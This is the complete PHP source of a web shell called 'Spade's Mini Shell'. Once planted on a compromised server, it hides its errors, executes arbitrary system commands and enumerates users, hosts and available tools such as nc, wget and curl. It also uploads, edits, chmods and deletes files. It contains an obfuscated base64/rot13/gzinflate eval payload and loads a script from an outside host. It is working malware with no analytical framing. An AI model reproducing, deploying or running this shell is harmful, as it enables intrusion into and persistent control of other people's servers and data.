<?php
	// Spade's Mini Shell
	@ini_set('error_log',NULL); 
	@ini_set('log_errors',0); 
	@ini_set('display_errors', 0);
	@error_reporting(0); 
	@error_log(false);
	$slash = '/';
	if(strtolower(substr(PHP_OS,0,3))=='win'){ $os = 'win'; $slash = '\\'; $ox = "Windows";}else{ $os = "nix"; $ox = "Linux"; }
	function sanitize($object){
		return filter_var(htmlspecialchars($object), FILTER_SANITIZE_STRING);
	}
	function get_users(){
		$users = array();
		$user = file("/etc/passwd");
		foreach ($user as $userx => $userz) {
			$userct = explode(":", $userz);
			array_push($users,$userct[0]);
		}
		if(!$user){
			if($open = opendir("/home/")){
				while(($file = readdir($open)) !== false){ array_push($users, $file); }
			}
			closedir($open);
		}
		$users = implode(', ', $users);
		return $users;
	}
	function exe($cmd){
		if(function_exists('system')) {         
	        @ob_start();        
	        @system($cmd);      
	        $buff = @ob_get_contents();         
	        @ob_end_clean();     
	    }elseif(function_exists('exec')) {         
	        @exec($cmd,$results);       
	        $buff = join("\n", $results); 
	    } elseif(function_exists('passthru')) {         
	        @ob_start();        
	        @passthru($cmd);        
	        $buff = @ob_get_contents();         
	        @ob_end_clean();     
	    } elseif(function_exists('shell_exec')) {       
	        $buff = @shell_exec($cmd);   
	    }elseif(function_exists('proc_open')){
	    	$desc = array(0 => array("pipe", "r"),  1 => array("pipe", "w"),  2 => array("pipe", "w"));
	    	$handle = proc_open($cmd, $desc, $pipes);
	    	if(is_resource($handle)){
	    		if(function_exists('fread') && function_exists('feof')){
	    			while(!feof($pipes[1])){ $buff .= fread($pipes[1], 512); }
	    		}elseif(function_exists('fgets') && function_exists('feof')){
	    			while(!feof($pipes[1])){ $buff .= fgets($pipes[1], 512); }
	    		}
	    	}
	    	pclose($handle);
	    }elseif(function_exists('popen')){
	    	$handle = popen($cmd, "r");
	    	if(is_resource($handle)){
	    		if(function_exists('fread') && function_exists('feof')){
	    			while(!feof($handle)){ $buff .= fread($handle, 512); }
	    		}elseif(function_exists('fgets') && function_exists('feof')){
	    			while(!feof($handle)){ $buff .= fgets($handle, 512); }
	    		}
	    	}
	    	pclose($handle);
	    }
	    $buff = wordwrap(htmlspecialchars($buff));
	    return $buff;
	}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B'))))); 
    	echo "
		<!DOCTYPE html>
		<html>
			<head>
				<link rel=\"shortcut icon\" href=\"http://i.imgur.com/iuhnNKU.png\" />
		        <meta name=\"ROBOTS\"       content=\"NOINDEX, NOFOLLOW, NOARCHIVE\" />
		        <meta name=\"GOOGLEBOT\"    content=\"NOINDEX, NOFOLLOW, NOARCHIVE\" />
		        <meta charset=\"UTF-8\">
		        <script type=\"text/javascript\" src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js\"></script>
				<link href='http://fonts.googleapis.com/css?family=Monoton' rel='stylesheet' type='text/css'>
		        <title>:~Spade Mini Shell~:</title>
		        <style>
		        @import url(\"http://fonts.googleapis.com/css?family=Iceberg:400\");
		        *, body, html { text-shadow: 0px 0px 1px #141414; cursor: url(http://cur.cursors-4u.net/cursors/cur-9/cur863.ani), url(http://cur.cursors-4u.net/cursors/cur-9/cur863.png), default !important;}
		        html {font-family: 'Iceberg';}
		        .chekwa{ display: none;}
		        .wala { border-bottom: none;}
		        input { border: none; background: none; font-family: 'Courier New';}
		        textarea{ background: #111111; font-family: 'Courier New'; font-size: 15px; border: 1px dashed lime; border-radius: 15px; padding: 10px; color: white;}
		        .submit{ background: lime; color: black; }
		        select{ background: lime; color: black; font-family: 'Courier New'; border: none;}
		        option{ font-family: 'Courier New'; background: lime; border: none;}
		        .titulo {text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color: #00ff00;text-decoration: none;}
		        body { background: #111111; color: white; text-align : center;}
		        .foot{ position: relative; width: 100%; bottom: 0;}
		        a { color: white; text-decoration: none;}
		        #details{ -moz-border-radius: 10px; border-radius: 10px; border:1px solid green; padding:4px 8px; line-height:16px; background:#111111; color:#aaa; margin:0 0 8px 0; min-height:100px; margin-top: 10px;}
		        tr:hover { background: #141414;}
		        a:hover { text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color: #00ff00;text-decoration: none; }
		        .lamesa, .mesa { width:100%; padding:4px 0; color:white; font-size:15px;}
		        .mesa td{ border-bottom:1px solid #222222; padding:0 8px; line-height:24px; vertical-align:top;}
		        .board {text-align: center;border: 1px solid rgba(255,180,0,0.4);border-radius: 4px;width: 500px;font-family: 'Monoton'}
				.board p {font-size: 65px;font-family: 'Monoton', cursive;color: #fff;text-transform: uppercase;padding: 0;margin: 0;}
				pre { text-align: left;}
				.pare{ border: 1px dashed lime; border-radius: 15px; color: #9b9b9b; font-size: 15px; font-family: 'Courier New'; padding: 15px;}
				textarea:focus{ outline: none;}
				.piktur { width: 60px; cursor: pointer; opacity: .5; transition: .5s ease-in-out;}
				.piktur:hover { opacity: 1; width: 75px;}
				code { font-family: monospace; }
		        </style>";?>
		        <script type="text/javascript">		    	
				$(document).ready(function() {$('#spade').novacancy({'reblinkProbability': 0.1,'blinkMin': 0.2,'blinkMax': 0.6,'loopMin': 8,'loopMax': 10,'color': '#ffffff','glow': ['0 0 80px #ffffff', '0 0 30px #008000', '0 0 6px #0000ff']}); 
				$('#pirates').novacancy({'blink': 1,'off': 1,'color': 'Red','glow': ['0 0 80px Red', '0 0 30px FireBrick', '0 0 6px DarkRed']});});
				</script>
				<?php echo "
			</head>
			<body>
				<noscript><meta http-equiv=\"refresh\" content=\"0; URL=http://xbox.nu/sssssssssssppppppppppaaaaaaaaaaaadddddddeeeeeeeee.html\"></noscript>
				<center><div class=\"board\" style=\"width: 30%;\"><p id=\"spade\">Spade</p><p id=\"pirates\">Mini Shell</p></div></center>
				<div id='details'>
				<table class=\"lamesa\" cellpadding=\"3\" cellspacing\"1\">
					<tr>
						<td><font class=\"titulo wala\">Directory:~$</font>&nbsp;";
						if(isset($_GET['path'])){
							$path = sanitize($_GET['path']);
						}else{
							$path = sanitize(getcwd());
						}
							$path = str_replace('\\','/',$path);
							$paths = explode('/',$path);
							foreach($paths as $id=>$peth){
								if($peth == '' && $id == 0){
									$a = true;
									echo "<a href=\"?path=/\">/</a>";
									continue;
								}//if
								if($peth == '') continue;
								echo "<a href='?path=";
								for($i=0;$i<=$id;$i++){
									echo $paths[$i];
									if($i != $id) echo "/";
								}//for
								echo "'>".$peth."</a>/";
							}//foreach
						echo "
						</td>
					</tr>
					<tr>
						<td>";
						if(isset($_FILES['file'])){
							if(@copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
								echo "<font color=lime><a href=".sanitize($_FILES['file']['name'])." target='_blank'>File Uploaded!</font><br/>";
							}else{
								echo "<font color=red>File Not Uploaded!</font><br/>";
							}//upload
						}//file
						echo "
							<form method=POST enctype=\"multipart/form-data\"><font class=\"titulo wala\">Upload File<br><label for=\"upload\"><img class=\"piktur\" src=\"http://xbox.nu/upload.png\"><input id=\"upload\" class=\"chekwa\" type=\"file\" name=\"file\"></label><br><input type=\"submit\" class=\"submit\" ";
							if(!is_writable($path)){echo "disabled value='Not Writable!' style='background: red;'";}else{ echo "value='Upload!'"; }
							echo "
							></form>
						</td>
					</tr><tr><td class=\"wala\">[<a href=".sanitize($_SERVER['PHP_SELF']).">Home</a>]&nbsp;[<a href='?details'>System Details</a>]&nbsp;[<a href='?kill'>Kill Me</a>]</td></tr></table></div><table>";
						if(isset($_GET['details'])){
							global $os;
							$ds = @ini_get("disable_functions");
							$show_ds = (!empty($ds)) ? "<font color=red>".sanitize(wordwrap($ds))."</font>" : "<font color=gold>NONE</font>";
							echo "</table><div id=\"details\"><table class=\"mesa\" width=100%><center>
							<tr><td><h1 class=titulo>System Information</h1></td></tr>
							<tr><td><font color=lime>OS</font>:: <font color=gold>".php_uname(s)."</font></td></tr>
							<tr><td><font color=lime>PHP Version</font>:: <font color=gold>".phpversion()."</font></td></tr>
							<tr><td><font color=lime>Kernel Release</font>:: <font color=gold>".php_uname(r)."</font></td></tr>
							<tr><td><font color=lime>Kernel Version</font>:: <font color=gold>".php_uname(v)."</font></td></tr>
							<tr><td><font color=lime>Machine</font>:: <font color=gold>".php_uname(m)."</font></td></tr>
							<tr><td><font color=lime>Server Software</font>:: <font color=gold>".$_SERVER['SERVER_SOFTWARE']."</font></td></tr>
							<tr><td style=\"text-align:left\"><font color=lime>Disabled Functions</font>:: <font color=gold>".wordwrap($show_ds)."</font></td></tr>";
							if(function_exists('apache_get_modules')){
								echo "<tr><td style=\"text-align:left\"><font color=lime>Loaded Apache Modules</font>:: <pre>";
								$apache = implode(', ', apache_get_modules());
								echo wordwrap($apache);
								echo "</pre></td></tr>";
							}//apache
							if($os == 'win'){echo "<tr><td style=\"text-align:left\"><font color=lime>Account Settings</font>:: <pre>".exe('net accounts')."</pre></td></tr><tr><td style=\"text-align:left\"><font color=lime>User Accounts</font>:: <pre>".exe('net user')."</pre></td></tr>";}//Windows
							if($os == 'nix'){
								echo "<tr><td style=\"text-align:left\"><font color=lime>Distro</font>:: <pre>".exe('cat /etc/*-release')."</pre></td></tr>
								<tr><td style=\"text-align:left\"><font color=lime>Distro Name</font>:: <pre>".exe('cat /etc/issue.net')."</pre></td></tr>
								<tr><td style=\"text-align:left\"><font color=lime>GCC</font>:: <pre>".exe('whereis gcc')."</pre></td></tr>
								<tr><td style=\"text-align:left\"><font color=lime>Perl</font>:: <pre>".exe('whereis perl')."</pre></td></tr>
								<tr><td style=\"text-align:left\"><font color=lime>Java</font>:: <pre>".exe('whereis java')."</pre></td></tr>
								<tr><td style=\"text-align:left\"><font color=lime>Python</font>:: <pre>".exe('whereis python')."</pre></td></tr>
								<tr><td style=\"text-align:left\"><font color=lime>Apache</font>:: <pre>".exe('whereis apache')."</pre></td></tr>
								<tr><td style=\"text-align:left\"><font color=lime>CPU</font>:: <pre>".exe('cat /proc/cpuinfo')."</pre></td></tr>
								<tr><td style=\"text-align:left\"><font color=lime>RAM</font>:: <pre>".exe('free -m')."</pre></td></tr>
								<tr><td style=\"text-align:left\"><font color=lime>User Limits</font>:: <pre>".exe('ulimit -a')."</pre></td></tr>
								";								
								  $useful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
					              $uze=array();
					              foreach($useful as $uzeful){
					                if(exe("which $uzeful")){
					                    $uze[]=$uzeful;
					                }
					              }
					              echo "<tr><td style='text-align:left'><font color=lime>Useful</font>::<pre>";
					              echo implode(', ',$uze);
					              echo "</pre></td></tr>";
					              $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
					              $uze=array();
					              foreach($downloaders as $downloader){
					                if(exe("which $downloader")){
					                    $uze[]=$downloader;
					                }
					              }
					              echo "<tr><td style='text-align:left'><font color=lime>Downloaders</font>::<pre>";
					              echo implode(', ',$uze);
					              echo "</pre></td></tr>";
					              echo "<tr><td style='text-align:left'><font color=lime>Users</font>::<pre>".wordwrap(get_users())."</pre</font></td></tr>
					                    <tr><td style='text-align:left'><font color=lime>Hosts</font>::<pre>".exe('cat /etc/hosts')."</pre></font></td></tr>";		
							}//Linux
							echo "</table></div>";
						}elseif(isset($_GET['kill'])){
							$me = sanitize($_SERVER['PHP_SELF']);
							$akez = basename($me);
							if(unlink($akez)){
								echo "<script>alert('Sayonara Suckers .|.')</script><meta http-equiv=\"refresh\" content=\"0; URL=http://xbox.nu/r3dDXDTOOL.swf\">";
							}else{ echo "<center><font color=red>Still Alive!</font></center>"; }
						}elseif(isset($_GET['filesource'])){
							echo "<tr><td class=\"titulo\"><center>Current File:~$&nbsp;".sanitize($_GET['filesource'])."</center></td></tr></table><br/>";
							echo "<pre class=\"pare\"><code>".wordwrap(sanitize(file_get_contents($_GET['filesource'])))."</code></pre>";
						}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
							echo "</table><br><center>".sanitize($_GET['path'])."<br><br>";
							if($_POST['opt'] == 'chmod'){
								if(isset($_POST['perm'])){
									if(@chmod($_POST['path'], $_POST['perm'])){
										echo "<font color=lime>Permission Changed!</font>";
									}else{
										echo "<font color=red>Permission Not Change!</font>";
									}//change perm * chmod
								}//perm
								echo "<form method=POST><font class=\"titulo\">Permission:~$&nbsp;</font><input type=\"text\" name=\"perm\" size=\"4\" value='".substr(sprintf('%o', fileperms($_POST['path'])), -4)."'><input type=\"hidden\" name=\"path\" value='".$_POST['path']."'><input type=\"hidden\" name=\"opt\" value=\"chmod\"><input type=\"submit\" class=\"submit\" value=\">>\"></form>";
							}elseif($_POST['opt'] == 'rename'){
								if(isset($_POST['newname'])){
									if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
										echo "<font color=lime>File Name Changed!</font><br>";
									}else{
										echo "<font color=red>File Name Not Change!</font>";
									}//rename
									$_POST['name'] = $_POST['newname'];
								}//rename
								echo "<form method=POST><font class=\"titulo\">New Name:~$&nbsp;</font><input name= \"newname\" type=\"text\" size=\"20\" value='".sanitize($_POST['name'])."'><input type=\"hidden\" name=\"path\" value='".sanitize($_POST['path'])."'><input type=\"hidden\" name=\"opt\" value=\"rename\"><input type=\"submit\" class=\"submit\" value=\">>\"></form>";
							}elseif($_POST['opt'] == 'edit'){
								if(isset($_POST['source'])){
									$fopen = fopen($_POST['path'], 'w');
									if(fwrite($fopen, $_POST['source'])){
										echo "<font color=lime>File Editted!</font><br>";
									}else{
										echo "<font color=red>File Not Editted!</font><br>";
									}//fwrite
									fclose($fopen);
								}//source
								echo "<form method=POST><textarea cols=80 rows=20 name=\"source\">".sanitize(file_get_contents($_POST['path']))."</textarea><br><input type=\"hidden\" name=\"path\" value='".sanitize($_POST['path'])."'><input type=\"hidden\" name=\"opt\" value=\"edit\"><input type=\"submit\" class=\"submit\" value=\">>\"></form>";
							}//chmod//rename//edit
							echo "</center>";
						}else{
							echo "</table><br></center>";
							if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
								if($_POST['type'] == 'dir'){
									if(rmdir($_POST['path'])){
										echo "<font color=lime>Directory Deleted!</font><br>";
									}else{
										echo "<font color=red>Directory Not Deleted!</font><br>";
									}//rmdir
								}elseif($_POST['type'] == 'file'){
									if(unlink($_POST['path'])){
										echo "<font color=lime>File Deleted!</font><br>";
									}else{
										echo "<font color=red>File Not Deleted!</font><br>";
									}//unlink
								}//dir//file
							}//delete
							echo "</center>";
							$scandir = scandir($path);
							echo "
							<div class=\"content\" id=\"details\">
								<table class=\"lamesa\" cellpadding=\"3\" cellspacing=\"1\">
									<tr>
										<th><font class=\"titulo\">Name</font></th>
										<th><font class=\"titulo\">Size</font></th>
										<th><font class=\"titulo\">Permissions</font></th>
										<th><font class=\"titulo\">Options</font></th>
									</tr>";
										foreach($scandir as $dir){
											if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
											echo "
											<tr>
												<td><a href=\"?path=".$path."/".$dir."\">".$dir."</a></td>
												<td><center>~</center></td>
												<td><center>";
													if(is_writable($path.'/'.$dir)) echo "<font color=lime>";//is_writable
													elseif(!is_readable($path.'/'.$dir)) echo "<font color=red>";//is_readable
														echo perms($path.'/'.$dir);
													if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo "</font>";
												echo "</center></td>
												<td><center>
													<form method=POST action=\"?option&path=".$path."\">
														<select name=\"opt\">
															<option value=\"\"></option>
															<option value=\"delete\">Delete</option>
															<option value=\"chmod\">Chmod</option>
															<option value=\"rename\">Rename</option>
														</select>
														<input type=\"hidden\" name=\"type\" value=\"dir\">
														<input type=\"hidden\" name=\"name\" value='".$dir.">
														<input type=\"hidden\" name=\"path\" value='".$path."/".$dir.">
														<input type=\"submit\" class=\"submit\" value=\">>\">
													</form>
												</center></td>
											</tr>";
										}//foreach
									echo "
									<tr>
										<td>----------------</td><td>----------------</td><td>----------------</td><td>----------------</td>
									</tr>";
										foreach($scandir as $file){
											if(!is_file($path.'/'.$file)) continue;//is_file
												$size = filesize($path.'/'.$file)/1024;
												$size = round($size,3);
												if($size >= 1024){
													$size = round($size/1024,2).' MB';
												}else{
													$size = $size.' KB';
												}//size
												echo "
												<tr>
													<td><a href=\"?filesource=".$path."/".$file."&path=".$path."\">".$file."</a></td>
													<td><center>".$size."</center></td>
													<td><center>"; 
														if(is_writable($path.'/'.$file)) echo "<font color=lime>";//is_writable
														elseif(!is_readable($path.'/'.$file)) echo "<font color=red>";//is_readable
															echo perms($path.'/'.$file);
														if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo "</font>";
																echo "</center></td>
																<td><center>
																	<form method=POST action=\"?option&path=".$path."\">
																		<select name=\"opt\">
																			<option value=\"\"></option>
																			<option value=\"edit\">Edit</option>
																			<option value=\"delete\">Delete</option>
																			<option value=\"chmod\">Chmod</option>
																			<option value=\"rename\">Rename</option>
																		</select>
																		<input type=\"hidden\" name=\"type\" value=\"file\">
																		<input type=\"hidden\" name=\"name\" value='".$file."'>
																		<input type=\"hidden\" name=\"path\" value='".$path."/".$file."'>
																		<input type=\"submit\" class=\"submit\" value=\">>\">
																	</form>
																</center></td>
															</tr>";
										}//foreach
									echo "
								</table>
							</div>";
						}//filesource//Delete
					echo "
				</table>

				<script type=\"text/javascript\" src=\"http://xbox.nu/novacancy.js\"></script>
				<div class='foot'>
					<hr width='80%'>
					<footer>&copy; <font color=lime class=titulo>Spade</font> ".date('Y')."</footer>
				</div>
			</body>
		</html>";
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
